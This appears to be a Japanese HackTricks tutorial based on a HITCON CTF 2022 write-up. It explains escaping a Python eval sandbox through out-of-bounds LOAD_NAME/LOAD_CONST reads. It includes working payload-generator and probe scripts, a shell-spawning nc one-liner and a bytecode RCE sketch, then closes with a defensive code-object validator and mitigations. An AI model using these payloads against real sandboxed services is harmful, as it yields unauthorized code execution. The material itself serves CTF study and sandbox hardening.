# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**この情報は** [**こちらの writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**から取得しました。**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD_NAME / LOAD_CONST opcode の OOB read 機能を使用して、メモリ内の任意の symbol を取得できます。つまり、`(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` のような trick を使って、必要な symbol（function name など）を取得できます。

あとは exploit を作成するだけです。

### 概要 <a href="#overview-1" id="overview-1"></a>

source code は非常に短く、わずか 4 行しかありません！
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
任意の Python code を入力でき、それは [Python code object](https://docs.python.org/3/c-api/code.html) にコンパイルされます。ただし、その code object の `co_consts` と `co_names` は、その code object を eval する前に空の tuple に置き換えられます。

そのため、consts（数値や文字列など）または names（変数や関数など）を含むすべての expression は、最終的に segmentation fault を引き起こす可能性があります。

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault はどのように発生するのでしょうか？

まず、簡単な例として、`[a, b, c]` は次の bytecode にコンパイルされます。
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
しかし、`co_names` が空の tuple になった場合はどうなるのでしょうか？`LOAD_NAME 2` opcode は依然として実行され、元々読み取るはずだったメモリアドレスから値を読み取ろうとします。そう、これは out-of-bound read の「feature」です。

解決策の基本的な考え方はシンプルです。CPython の一部の opcode、例えば `LOAD_NAME` や `LOAD_CONST` は、OOB read に脆弱です（？）。

これらは、`consts` または `names` tuple（内部ではそれぞれ `co_consts` と `co_names` と呼ばれています）から、インデックス `oparg` のオブジェクトを取得します。次の短い `LOAD_CONST` の snippet を見ると、CPython が `LOAD_CONST` opcode を処理する際に何を行うのかを確認できます。
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
この方法で、OOB feature を使って任意のメモリオフセットから `"name"` を取得できます。どのような name で、どのオフセットにあるかを確認するには、`LOAD_NAME 0`、`LOAD_NAME 1` ... `LOAD_NAME 99` ... と試し続けるだけです。oparg > 700 付近で何か見つかるかもしれません。もちろん、gdb を使ってメモリレイアウトを確認することもできますが、そのほうが簡単になるとは思いません。

### Exploit の生成 <a href="#generating-the-exploit" id="generating-the-exploit"></a>

names / consts の有用なオフセットを取得できたとして、そのオフセットから name / const を取得して利用するにはどうすればよいでしょうか。ここで、次の trick を紹介します:\
`co_names=()` の状態で、オフセット 5 (`LOAD_NAME 5`) から `__getattribute__` name を取得できると仮定すると、次のようにします:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> `__getattribute__` として名前を付ける必要はなく、もっと短い名前や、さらに奇妙な名前を付けることもできます。

その理由は、bytecode を見るだけで理解できます。
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR` も `co_names` から name を取得することに注意してください。Python は name が同じ場合、同じ offset から name をロードするため、2 つ目の `__getattribute__` も引き続き offset=5 からロードされます。この機能を使うと、name が近くのメモリ内に存在している場合、任意の name を使用できます。

数値の生成は簡単です。

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

長さ制限のため、consts は使用していません。

まず、name の offset を見つけるための script を示します。
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
以下は実際の Python exploit を生成するためのものです。
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
基本的に、`__dir__` メソッドから取得した文字列に対して、以下の処理を行います：
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### バージョンに関する注記と影響を受ける opcode（Python 3.11–3.13）

- CPython の bytecode opcode は、整数オペランドによって `co_consts` および `co_names` タプルを引き続きインデックス参照します。攻撃者がこれらのタプルを空（または bytecode で使用される最大インデックスより小さい状態）にできる場合、interpreter はそのインデックスの範囲外メモリを読み取り、近傍メモリから任意の PyObject pointer を取得します。関連する opcode には少なくとも以下が含まれます。
- `LOAD_CONST consti` → `co_consts[consti]` を読み取ります。
- `LOAD_NAME namei`、`STORE_NAME`、`DELETE_NAME`、`LOAD_GLOBAL`、`STORE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`LOAD_ATTR`、`STORE_ATTR` → `co_names[...]` から name を読み取ります（3.11+ では `LOAD_ATTR`/`LOAD_GLOBAL` が low bit に flag bits を格納する点に注意してください。実際のインデックスは `namei >> 1` です）。バージョンごとの正確なセマンティクスについては disassembler docs を参照してください。[Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+ では、命令間に hidden `CACHE` entries を追加する adaptive/inline caches が導入されました。これは OOB primitive 自体を変更しません。ただし、bytecode を手動で作成する場合は、`co_code` の構築時にこれらの cache entries を考慮する必要があります。

実用上の意味：code object（例：`CodeType.replace(...)` 経由）を制御でき、`co_consts`/`co_names` を小さくできる場合、このページの technique は CPython 3.11、3.12、3.13 でも引き続き機能します。

### 有用な OOB インデックス用の簡易 scanner（3.11+/3.12+ compatible）

high-level source ではなく bytecode から直接 interesting objects を probe したい場合は、最小限の code objects を生成し、インデックスを brute force できます。以下の helper は、必要に応じて inline caches を自動的に挿入します。
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
メモ
- 代わりに names を probe するには、`LOAD_CONST` を `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` に置き換え、stack の使用方法を適宜調整します。
- 必要に応じて、`EXTENDED_ARG` または `arg` の複数バイトを使用して、255 より大きい index に到達します。上記のように `dis` で構築する場合、制御できるのは low byte のみです。より大きな index については、raw bytes を自分で構築するか、複数の load に分けて attack を行います。

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

`co_consts` index が builtins module に解決されることを特定できたら、stack を操作することで `co_names` を使わずに `eval(input())` を再構築できます:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
このアプローチは、`co_code` を直接制御できる一方で `co_consts=()` と `co_names=()` を強制される challenge（例：BCTF 2024 “awpcode”）で有用です。source-level の tricks を避け、bytecode の stack ops と tuple builders を活用することで、payload size を小さく保てます。

### sandboxes に対する防御チェックと mitigation

信頼できない code を compile/evaluate したり、code objects を操作したりする Python “sandbox” を作成する場合、bytecode で使用される tuple indexes の bounds-checking を CPython に依存しないでください。代わりに、実行前に code objects 自体を検証してください。

実用的な validator（`co_consts`/`co_names` への OOB access を拒否）
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
追加の緩和策
- 信頼できない入力に対して任意の `CodeType.replace(...)` を許可しない、または生成された code object に対して厳格な構造チェックを追加する。
- CPython のセマンティクスに依存する代わりに、OS レベルの sandbox（seccomp、job objects、containers）を使用して、信頼できない code を別プロセスで実行することを検討する。

## References

- [1] [この technique の起源と exploit chain の概要に関する Splitline の HITCON CTF 2022 writeup「V O I D」](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python disassembler docs（LOAD_CONST/LOAD_NAME などの indices semantics、および 3.11+ における `LOAD_ATTR`/`LOAD_GLOBAL` の low-bit flags）](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
